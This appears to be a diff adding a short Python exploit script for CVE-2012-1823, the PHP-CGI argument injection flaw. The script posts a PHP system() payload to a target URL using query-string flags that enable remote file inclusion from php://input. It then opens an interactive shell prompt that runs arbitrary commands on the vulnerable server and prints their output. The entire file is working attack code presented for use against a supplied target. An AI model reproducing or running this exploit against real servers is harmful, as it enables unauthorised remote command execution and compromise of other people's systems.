@@ -1,0 +1,25 @@
+import requests, sys, readline
+
+banner = '''
+ --------------------
+|      PHP CGI       | CVE-2012-1823
+ --------------------  
+| Argument Injection | @gtx666ti | github.com/theykillmeslowly
+ --------------------
+'''
+def execute(target, command):
+    try:
+        data = '<?php system("{}")?>|gtx|'.format(command)
+        r    = requests.post('{}/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'.format(target), data=data)
+        return str(r.text.split('|gtx|')[0].strip())
+    except:
+        execute(target, command)
+if(len(sys.argv) < 2):
+    print(banner)
+    print("Usage : python3 {} http://target.com/".format(sys.argv[0]))
+else:
+    print(banner)
+    target = sys.argv[1]
+    while(1):
+        command = input("$ ")
+        print(execute(target, command))
